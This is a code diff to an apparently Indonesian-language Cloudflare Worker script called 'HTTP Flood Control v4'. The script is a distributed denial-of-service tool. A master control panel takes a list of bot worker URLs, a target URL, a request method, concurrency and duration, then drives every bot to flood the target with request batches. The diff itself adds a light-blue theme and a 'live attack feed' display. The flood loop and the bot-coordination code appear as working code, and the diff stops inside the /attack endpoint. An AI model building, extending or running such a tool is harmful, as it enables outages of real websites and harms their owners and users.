@@ -1,7 +1,6 @@
 /**
- * HTTP Flood Control v3
- * - Mode Bot: Worker biasa (terima perintah /attack)
- * - Mode Master: panel pengontrol yang perintah banyak bot sekaligus
+ * HTTP Flood Control v4
+ * Tema biru muda + layar kecil live attack (mobile-friendly, ringan)
  */
 
 const BOT_HTML = `<!DOCTYPE html>
@@ -11,15 +10,15 @@ const BOT_HTML = `<!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Flood Bot</title>
 <style>
-body{font-family:system-ui;background:#070b14;color:#e2e8f0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
-.card{background:#0f1623;border:1px solid #1c2738;border-radius:16px;padding:32px;text-align:center;max-width:360px}
-h1{font-size:1.4rem;margin-bottom:8px}.sub{color:#94a3b8;font-size:.9rem}
+body{font-family:system-ui;background:#e8f4fc;color:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+.card{background:#fff;border:1px solid #bae6fd;border-radius:16px;padding:32px;text-align:center;max-width:360px;box-shadow:0 10px 25px rgba(14,165,233,.12)}
+h1{font-size:1.35rem;margin-bottom:8px;color:#0284c7}.sub{color:#64748b;font-size:.9rem}
 </style>
 </head>
 <body>
 <div class="card">
 <h1>Flood Bot Active</h1>
-<p class="sub">Worker ini siap menerima perintah dari Master Control.<br>Jangan buka langsung — pakai panel Master.</p>
+<p class="sub">Worker siap menerima perintah dari Master.<br>Jangan buka langsung.</p>
 </div>
 </body>
 </html>`;
@@ -28,21 +27,90 @@ const MASTER_HTML = `<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Master Flood Control</title>
 <style>
-:root{--bg:#070b14;--card:#0f1623;--border:#1c2738;--accent:#3b82f6;--text:#f1f5f9;--muted:#94a3b8;--ok:#22c55e;--err:#ef4444;--warn:#f59e0b}
-*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:20px;display:flex;align-items:center;justify-content:center}.wrap{width:100%;max-width:720px}.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:28px 24px;box-shadow:0 20px 40px rgba(0,0,0,.45)}h1{font-size:1.5rem;font-weight:700;margin-bottom:6px}.sub{color:var(--muted);font-size:.9rem;margin-bottom:22px;line-height:1.4}label{display:block;font-size:.78rem;font-weight:600;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.04em}input,textarea,select{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:11px;padding:12px 14px;color:var(--text);font-size:.95rem;margin-bottom:14px}textarea{min-height:110px;resize:vertical;font-family:ui-monospace,monospace;font-size:.85rem}input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent)}.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}.btns{display:flex;gap:10px;margin:8px 0 18px}button{flex:1;padding:14px;border:none;border-radius:11px;font-size:.95rem;font-weight:600;cursor:pointer}#btnStart{background:var(--accent);color:#fff}#btnStart:disabled{opacity:.45;cursor:not-allowed}#btnStop{background:transparent;border:1px solid var(--err);color:var(--err)}#btnStop:disabled{opacity:.35;cursor:not-allowed}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:16px}.stat{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:14px 8px;text-align:center}.stat b{display:block;font-size:1.25rem;font-weight:700;margin-bottom:3px}.stat span{font-size:.68rem;color:var(--muted);text-transform:uppercase}.log{background:var(--bg);border:1px solid var(--border);border-radius:12px;height:220px;overflow-y:auto;padding:12px 14px;font-family:ui-monospace,monospace;font-size:.78rem;line-height:1.5}.log div{margin-bottom:3px}.ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}.status{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:.85rem;color:var(--muted)}.dot{width:8px;height:8px;border-radius:50%;background:var(--muted)}.dot.on{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:pulse 1.1s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}@media(max-width:560px){.grid3{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
+:root{
+  --bg:#e8f4fc;
+  --card:#ffffff;
+  --border:#bae6fd;
+  --accent:#0ea5e9;
+  --accent2:#0284c7;
+  --text:#0f172a;
+  --muted:#64748b;
+  --ok:#10b981;
+  --err:#ef4444;
+  --warn:#f59e0b;
+  --livebg:#f0f9ff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:16px;display:flex;align-items:flex-start;justify-content:center}
+.wrap{width:100%;max-width:680px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:22px 18px;box-shadow:0 10px 30px rgba(14,165,233,.1)}
+h1{font-size:1.35rem;font-weight:700;color:var(--accent2);margin-bottom:4px}
+.sub{color:var(--muted);font-size:.85rem;margin-bottom:18px;line-height:1.4}
+label{display:block;font-size:.72rem;font-weight:600;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em}
+input,textarea,select{width:100%;background:#f8fafc;border:1px solid var(--border);border-radius:10px;padding:11px 12px;color:var(--text);font-size:.9rem;margin-bottom:12px}
+textarea{min-height:90px;resize:vertical;font-family:ui-monospace,monospace;font-size:.8rem}
+input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent);background:#fff}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+.btns{display:flex;gap:8px;margin:6px 0 14px}
+button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-weight:600;cursor:pointer}
+#btnStart{background:var(--accent);color:#fff}
+#btnStart:disabled{opacity:.45;cursor:not-allowed}
+#btnStop{background:transparent;border:1px solid var(--err);color:var(--err)}
+#btnStop:disabled{opacity:.35;cursor:not-allowed}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.stat{background:var(--livebg);border:1px solid var(--border);border-radius:10px;padding:10px 6px;text-align:center}
+.stat b{display:block;font-size:1.15rem;font-weight:700;color:var(--accent2);margin-bottom:2px}
+.stat span{font-size:.65rem;color:var(--muted);text-transform:uppercase}
+
+/* Layar kecil live attack - khusus mobile, ringan */
+.live-screen{
+  background:#0c4a6e;
+  border-radius:12px;
+  padding:10px 12px;
+  margin-bottom:12px;
+  height:110px;
+  overflow:hidden;
+  position:relative;
+  font-family:ui-monospace,monospace;
+  font-size:.72rem;
+  color:#7dd3fc;
+  line-height:1.45;
+}
+.live-screen .title{
+  color:#38bdf8;
+  font-size:.68rem;
+  font-weight:600;
+  margin-bottom:4px;
+  letter-spacing:.03em;
+}
+.live-feed{
+  height:78px;
+  overflow:hidden;
+}
+.live-feed div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.live-ok{color:#4ade80}.live-err{color:#f87171}.live-info{color:#7dd3fc}
+
+.log{background:#f8fafc;border:1px solid var(--border);border-radius:10px;height:160px;overflow-y:auto;padding:10px 12px;font-family:ui-monospace,monospace;font-size:.75rem;line-height:1.45}
+.log div{margin-bottom:2px}
+.ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}
+.status{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:.8rem;color:var(--muted)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--muted)}
+.dot.on{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:pulse 1.1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+@media(max-width:560px){.grid3{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
 </style>
 </head>
 <body>
 <div class="wrap">
 <div class="card">
 <h1>Master Flood Control</h1>
-<p class="sub">Satu panel mengontrol banyak Worker bot.<br>Masukkan daftar URL bot (satu baris satu URL).</p>
+<p class="sub">Satu panel kendalikan banyak bot. Tema biru muda + layar live ringan.</p>
 
 <label>Daftar Bot Worker (satu baris satu URL)</label>
-<textarea id="bots" placeholder="https://bot1.xxx.workers.dev\nhttps://bot2.xxx.workers.dev\nhttps://bot3.xxx.workers.dev"></textarea>
+<textarea id="bots" placeholder="https://bot1.xxx.workers.dev\nhttps://bot2.xxx.workers.dev"></textarea>
 
 <label>Target URL</label>
 <input type="url" id="target" placeholder="https://target.com">
@@ -50,8 +118,8 @@ const MASTER_HTML = `<!DOCTYPE html>
 <div class="grid3">
 <div><label>Method</label>
 <select id="method"><option>GET</option><option>POST</option><option>HEAD</option></select></div>
-<div><label>Concurrency / bot</label>
-<input type="number" id="conc" value="20" min="1" max="40"></div>
+<div><label>Concurrency/bot</label>
+<input type="number" id="conc" value="15" min="1" max="30"></div>
 <div><label>Durasi (detik)</label>
 <input type="number" id="dur" value="20" min="5" max="60"></div>
 </div>
@@ -61,8 +129,14 @@ const MASTER_HTML = `<!DOCTYPE html>
 <button id="btnStop" disabled>Stop</button>
 </div>
 
+<!-- Layar kecil live attack -->
+<div class="live-screen">
+  <div class="title">LIVE ATTACK FEED</div>
+  <div class="live-feed" id="live"></div>
+</div>
+
 <div class="stats">
-<div class="stat"><b id="sBot">0</b><span>Bot Aktif</span></div>
+<div class="stat"><b id="sBot">0</b><span>Bot</span></div>
 <div class="stat"><b id="sSent">0</b><span>Terkirim</span></div>
 <div class="stat"><b id="sOk">0</b><span>Sukses</span></div>
 <div class="stat"><b id="sRps">0</b><span>RPS</span></div>
@@ -77,14 +151,29 @@ const MASTER_HTML = `<!DOCTYPE html>
 <script>
 const $ = id => document.getElementById(id);
 let running = false;
+let liveCount = 0;
 
 function log(msg, cls='info'){
   const d=document.createElement('div');
   d.className=cls;
   d.textContent='['+new Date().toLocaleTimeString('id-ID',{hour12:false})+'] '+msg;
   $('log').appendChild(d);
+  if($('log').children.length>40)$('log').removeChild($('log').firstChild);
   $('log').scrollTop=$('log').scrollHeight;
 }
+
+function live(msg, cls='live-info'){
+  const d=document.createElement('div');
+  d.className=cls;
+  d.textContent=msg;
+  $('live').appendChild(d);
+  liveCount++;
+  if(liveCount>8){
+    $('live').removeChild($('live').firstChild);
+    liveCount--;
+  }
+}
+
 function setStatus(on,text){
   $('dot').classList.toggle('on',on);
   $('stxt').textContent=text;
@@ -101,27 +190,30 @@ async function start(){
   if(!target.startsWith('http')){log('Target URL tidak valid','err');return;}
 
   const method = $('method').value;
-  const conc = Math.min(40,Math.max(1,+$('conc').value||20));
+  const conc = Math.min(30,Math.max(1,+$('conc').value||15));
   const dur = Math.min(60,Math.max(5,+$('dur').value||20));
 
   running = true;
   $('btnStart').disabled=true;
   $('btnStop').disabled=false;
   $('log').innerHTML='';
+  $('live').innerHTML='';
+  liveCount=0;
   $('sBot').textContent=bots.length;
   $('sSent').textContent=0; $('sOk').textContent=0; $('sRps').textContent=0;
 
-  setStatus(true,'Mengirim perintah ke '+bots.length+' bot');
+  setStatus(true,'Menyerang dengan '+bots.length+' bot');
   log('Target: '+target,'info');
-  log('Bot: '+bots.length+' | Concurrency/bot: '+conc+' | Durasi: '+dur+'s','info');
+  log('Bot: '+bots.length+' | Conc/bot: '+conc+' | Durasi: '+dur+'s','info');
+  live('>> ATTACK STARTED','live-ok');
 
   const t0 = Date.now();
   const end = t0 + dur*1000;
   let sent=0, ok=0;
 
-  // Setiap bot dijalankan parallel
-  const workers = bots.map(async (botUrl) => {
+  const workers = bots.map(async (botUrl, idx) => {
     const base = botUrl.replace(/\/$/, '');
+    const botName = 'bot'+(idx+1);
     while(running && Date.now()<end){
       const batch = [];
       for(let i=0;i<conc;i++){
@@ -137,7 +229,12 @@ async function start(){
             $('sOk').textContent=ok;
             const elapsed=(Date.now()-t0)/1000;
             $('sRps').textContent=elapsed>0?Math.round(sent/elapsed):0;
-          }).catch(()=>{sent++;$('sSent').textContent=sent;})
+            if(sent%7===0) live(botName+' → '+ (r.status||'?') +' | total '+sent, r.ok?'live-ok':'live-err');
+          }).catch(()=>{
+            sent++;
+            $('sSent').textContent=sent;
+            if(sent%7===0) live(botName+' → fail | total '+sent,'live-err');
+          })
         );
       }
       await Promise.all(batch);
@@ -150,7 +247,8 @@ async function start(){
   $('btnStart').disabled=false;
   $('btnStop').disabled=true;
   setStatus(false,'Selesai');
-  log('Selesai. Total terkirim: '+sent+' | Sukses: '+ok,'ok');
+  live('>> ATTACK FINISHED','live-ok');
+  log('Selesai. Terkirim: '+sent+' | Sukses: '+ok,'ok');
 }
 
 $('btnStart').onclick=start;
@@ -159,6 +257,7 @@ $('btnStop').onclick=()=>{
   $('btnStart').disabled=false;
   $('btnStop').disabled=true;
   setStatus(false,'Dihentikan');
+  live('>> STOPPED','live-err');
   log('Dihentikan manual','warn');
 };
 </script>
@@ -170,21 +269,18 @@ export default {
     const u = new URL(request.url);
     const mode = u.searchParams.get('mode') || 'bot';
 
-    // Master Control UI
     if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '') && mode === 'master') {
       return new Response(MASTER_HTML, {
         headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
       });
     }
 
-    // Bot UI (default)
     if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
       return new Response(BOT_HTML, {
         headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
       });
     }
 
-    // Attack endpoint (dipakai Master & bot sendiri)
     if (request.method === 'POST' && u.pathname === '/attack') {
       try {
         const body = await request.json();
